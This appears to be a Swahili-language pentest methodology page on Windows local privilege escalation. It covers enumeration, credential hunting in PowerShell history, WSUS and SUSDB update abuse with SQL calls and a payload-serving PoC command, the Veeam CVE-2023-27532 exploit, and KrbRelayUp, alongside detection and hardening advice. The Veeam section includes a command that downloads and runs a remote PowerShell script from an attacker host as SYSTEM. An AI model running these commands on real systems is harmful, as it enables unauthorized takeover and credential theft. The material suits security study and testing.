# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta vectors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unajumuisha mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mfuatano wake wa vitendo wa enumeration pia unatokana na warsha na checklists za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Viwango vya Uadilifu

**Ikiwa hujui integrity levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna vitu mbalimbali katika Windows vinavyoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu hizi zote za ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa UEFI NVRAM ukiwa offline kuwa DMA kabla ya boot na mfululizo wa kubadilisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ulinzi wa Admin / Elevation ya kimya ya UIAccess

Michakato ya UIAccess iliyoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa kufikia High IL bila prompts wakati ukaguzi wa njia salama wa AppInfo unapozimwa. Angalia workflow maalum ya bypass ya UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa registry ya ufikivu wa Secure Desktop unaweza kutumiwa kuandika registry yoyote kwa SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Build za hivi karibuni za Windows pia zilianzisha njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye upendeleo unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia kama toleo la Windows lina vulnerability yoyote inayojulikana (pia kagua patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Tovuti hii](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalotokana na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa za OS build, masasisho yaliyosakinishwa, na wagombea wa ushauri waliochaguliwa; thibitisha bidhaa husika na masasisho yaliyotangulia kabla ya kuchukulia matokeo kuwa yanatumika.

Kwa local exploit inayohusiana na toleo mahususi, angalia **usanifu wa mchakato unaoendesha** pamoja na usanifu wa OS. Kwenye Windows ya biti 64, mchakato wa biti 32 huathiriwa na [uelekezaji upya wa mfumo wa faili wa WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya biti 32, ilhali `%windir%\Sysnative` huupa mchakato huo ufikiaji wa saraka ya mfumo asilia. Jina hili la pak na halipatikani kwa mchakato wa biti 64. OS build au mgombea wa KB inayokosekana haithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendesha, sasisho lililosakinishwa au lililotangulia, usanifu wa mchakato, na masharti ya exploit na [taarifa ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya suala husika.

Kwa mfano wa uharibifu wa kumbukumbu ya huduma, tazama [offsets za ring za kumbukumbu iliyoshirikiwa za MIDI zinazodhibitiwa na mteja](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Stack offsets zilizochapishwa zinatumika tu kwa build iliyojaribiwa; kupata `LOCAL SERVICE` ni hatua tofauti na hatua inayofuata ya [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ya kupata `SYSTEM`.<sup>[[44]](#references)</sup>

**Ndani ya mashine kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credentials/taarifa zozote za Juicy zilizohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha kipengele hiki kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya transcription ya PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mpangilio wa `OutputDirectory` au `Start-Transcript -OutputDirectory` unaweza kuelekeza faili kwenye folda iliyoshirikiwa au iliyofichwa. Kagua njia halisi ya kuhifadhi na ACL ya faili kabla ya kukagua transcript: inaweza kuwa na hoja za amri na matokeo yake, ikiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanafichua utambulisho wa kiwango cha juu cha ruhusa unaoweza kutumika, na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yake yasirekodiwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowerShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, na kuhakikisha kuwa kila sehemu ya code inaandikwa inapoendeshwa. Mchakato huu huhifadhi rekodi ya kina ya ukaguzi wa kila shughuli, yenye manufaa kwa forensics na kuchanganua tabia hasidi. Kwa kurekodi shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana kwenye Windows Event Viewer katika njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulieleza hatari kama ifuatavyo:

Unaweza kuhatarisha mfumo ikiwa masasisho yataombwa kwa kutumia http badala ya http**S**.

Endpoint ya WSUS inayotumia HTTP ni dalili ya kuchunguza uwezekano wa kuingiliwa kwa metadata ya masasisho. Unyonyaji pia hutegemea iwapo mteja anatumia seva hiyo ya WSUS, iwapo mshambuliaji anaweza kuingilia au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi kuwa utekelezaji wa code unaweza kufanyika. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kukagua iwapo mtandao unatumia sasisho za WSUS zisizo za SSL kwa kuendesha yafuatayo katika cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu uwezekano wa kutumika ilikuwa:

Basi, **inaweza kutumiwa.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intranet iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya HTTP interception, lakini haithibitishi kwamba interception, kukubaliwa kwa sasisho hasidi, au usakinishaji wenye marupurupu ya juu unawezekana. Wakati ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM weaponized exploits za kuingiza masasisho 'bandia' kwenye trafiki ya WSUS isiyo ya SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, huu ndio udhaifu ambao bug hii hutumia:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates hutumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya kifaa chetu ili kunasa trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye marupurupu ya juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia hifadhi yake ya certificate. Tukitengeneza certificate iliyosainiwa yenyewe kwa hostname ya WSUS na kuongeza certificate hiyo kwenye hifadhi ya certificate ya mtumiaji wa sasa, tutaweza kunasa trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo kama HSTS kutekeleza uthibitishaji wa trust-on-first-use kwenye certificate. Ikiwa certificate iliyowasilishwa inaaminiwa na mtumiaji na ina hostname sahihi, itakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (itakapopatikana).

### Masasisho ya WSUS yanayodhibitiwa na msimamizi

Njia tofauti ipo wakati utambulisho wa sasa unaweza **kuchapisha na kuidhinisha** masasisho kwenye seva ya WSUS. Kagua uanachama halisi katika kundi la seva la `WSUS Administrators` na ruhusa zozote za WSUS zilizokasimiwa, kisha utambue kundi la kompyuta za mteja ambalo lingepokea sasisho lililoidhinishwa. [Microsoft inahitaji marupurupu ya WSUS Administrator ili kuidhinisha masasisho](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaandika kuhusu uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini inayotumiwa kwa maudhui yaliyochapishwa ndani ya nchi. Thibitisha kwamba sasisho husika limesainiwa na linakubaliwa, linatumika kwa lengo, na linasakinishwa katika muktadha wenye marupurupu ya juu kabla ya kulichukulia kama njia ya kuongeza marupurupu. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya masasisho maalum ya SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kunasa muunganisho wa HTTP WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za hifadhidata ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha sasisho maalum. Njia moja ya kuingia inayoweza kutumika ni kupeleka akaunti ya kompyuta ya WSUS ya upstream kupitia relay hadi kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi, kwa hiyo anza kwa kuorodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa unahitaji haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya mashambulizi inayotumia relay kupeleka uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 hadi LDAP, SMB, au AD CS, angalia [Kutumia vibaya WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya hifadhidata ya nje na ruhusa za procedure

Katika usanidi ambapo WSUS hutumia SQL Server ya nje, kwanza kagua ikiwa akaunti ya seva ya WSUS inaweza kuthibitishwa kwenye hifadhidata na kama NTLM relay inafikia listener hiyo. Role ya SQL ya seva inaweza kuruhusu procedure za kuchapisha masasisho hata kama uandishi wa moja kwa moja kwenye jedwali umekataliwa; `UPDATE` iliyoshindwa kwenye `SUSDB` haithibitishi kuwa uchapishaji umezuiwa. Kagua utambulisho halisi, uanachama wa role, na ruhusa za procedure katika session ya SQL iliyoidhinishwa kabla ya kujaribu sasisho maalum.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Ufafanuzi wa taratibu za moja kwa moja na `SoftwareDistributionPackage.xsd` iliyosakinishwa ni muhimu wakati wa kuunda upya metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate` na uhakikishe uhusiano wa bundle, digests, ukubwa, URL ya content, na revision vinalingana. Huu ni mtiririko wa uchapishaji wenye hali, kwa hivyo mwito mmoja tu wa stored procedure uliofanikiwa si uthibitisho kwamba utekelezaji upande wa client ulifanyika.<sup>[[38]](#references)</sup>

#### Tengeneza, lengesha na idhinisha update

Mtiririko wa custom-update hutumia taratibu halali za WSUS kama API ya uchapishaji yenye vikwazo. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi fragments za XML za masharti ya awali, za lugha, na zilizopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya content na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na uongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima vilingane katika metadata/fragments zilizoingizwa. Baada ya kuweka URL ya content na kundi lengwa, idhini ya mwisho inafanana na ifuatayo; tumia vitambulishi vipya vya update, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Kukwepa signature kunakoendeshwa na extension

WSUS kwa kawaida hukataa maudhui yoyote ya executable yasiyo na saini. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka bendera ya ukaguzi wa cheti kuwa false pale jina la faili lililotolewa linapoishia kwa `.txt` au `.esd`; hivyo `CheckCertificateSignature` hurukwa bila kwanza kuthibitisha kwamba baiti ni maandishi au image halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita uthibitishaji wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji wa update ya command-line. Hili ni bug ya policy/type-confusion, si kughushi signature.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Uwekaji na otomatiki unaoendana na BITS

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Chanzo lazima kitimize matarajio ya HTTP ya BITS: kuwa na URL inayofikika pekee hakutoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyounga mkono Range husababisha WSUS kutoa tukio la usawazishaji `EventId=364` linalosema kwamba BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, hujumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuiendesha, na husambaza `BitsWebServer.py` kwa ajili ya kuweka maudhui. Amri ya chini kabisa ya kutumia katika lab iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji usiosimamiwa na persistence ya kujaribu tena

Mwingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, hufanya update iliyoidhinishwa ipakuliwe na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/haijakamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; huonekana wazi kwa sababu mteja huonyesha hali ya update-failed.<sup>[[39]](#references)</sup>

#### Mielekeo ya utambuzi na uimarishaji wa usalama

Mielekeo muhimu ya upande wa server na client kutoka kwenye mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `SUSDB` wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate`; chunguza vikundi vipya vya targeting, vyanzo vya maudhui vya nje, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (jina lenye kosa la tahajia), na `EventId=364`; linganisha uthibitishaji na extension ya payload na magic ya maudhui badala ya kuamini suffix.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara na utekelezaji wa PE au shughuli za child/network zisizotarajiwa kutoka kwenye maudhui yenye majina ya `.txt` au `.esd`.
- Hitaji Extended Protection for Authentication kwenye huduma ya database panapoungwa mkono, na zuia ufikiaji wa mtandao wa database kwa server ya WSUS na mifumo ya usimamizi iliyoidhinishwa pekee. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Auto-Updater za Watu Wengine na Agent IPC (local privesc)

Wakala wengi wa enterprise huonyesha sehemu ya IPC ya localhost na channel ya update yenye privileged access. Ikiwa enrollment inaweza kulazimishwa kuelekea server ya mshambuliaji na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM huisakinisha. Tazama technique iliyojumlishwa (inayotegemea mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyotegemea toleo mahususi na dokezo la reconnaissance yalikuwa:

Veeam B&R < `11.0.1.1261` huonyesha huduma ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na mshambuliaji, na kuruhusu amri kiholela kutekelezwa kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: thibitisha listener na toleo, k.m., `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguo-msingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials za database ya usanidi zilizosimbwa ndani ya mipaka ya mtandao wa backup; PoC nyingine ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huduma inaweza kufungamana na anwani iliyo nje ya localhost, kwa hiyo kagua anwani yake halisi na PID.

- **Recon**: thibitisha kuwa TCP/9401 ni ya `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kuwa matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathiriwa. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi ambayo haijafanyiwa patch na patch ya baadaye kwenye namba hizo hizo za build. Thibitisha kitambulisho cha patch dhidi ya [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kutangaza kuwa build ya mpaka imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLL zinazohitajika kwenye saraka moja, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyorejelewa inaonyesha utekelezaji wa amri kama SYSTEM wakati masharti yake ya ziada yametimizwa; ushauri wa vendor unaeleza tatizo la kufichuliwa kwa credentials.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira chaguomsingi yalikuwa:

Athari ya **local privilege escalation** ipo katika mazingira ya Windows **domain** chini ya hali maalum. Hali hizi zinajumuisha mazingira ambamo **LDAP signing haijalazimishwa,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na watumiaji wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba **mahitaji** haya hutimizwa kwa kutumia **mipangilio chaguomsingi**.

Kerberos relay ya ndani inaweza kuvuka kutoka logon yenye ruhusa za chini hadi uandishi wa directory wenye ruhusa za juu, pale COM server inayofaa inapofanya authentication na principal inayorelayiwa ina haki kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) LDAP writes za RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha baadhi ya njia hizi kiotomatiki. Mnyororo wa RBCD unahitaji delegation inayotumika na haki kwenye object lengwa, huku mnyororo wa shadow-credential ukihitaji haki za kuandika key-credential na KDC inayotumia njia ya certificate authentication. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

Kagua sera halisi za DC kuhusu [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), object ACL ya utambulisho unaorelayiwa, na viwango vya authentication na impersonation vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credentials ni muhimu: session ya WinRM inaweza kutenda tofauti na logon ya mwingiliano au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa zinaweza pia kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kama jambo la kuchunguzwa; enumeration tulivu haipaswi kuanzisha COM coercion, relay authentication, au directory writes. Shadow credential ya akaunti ya mashine inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina haki zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

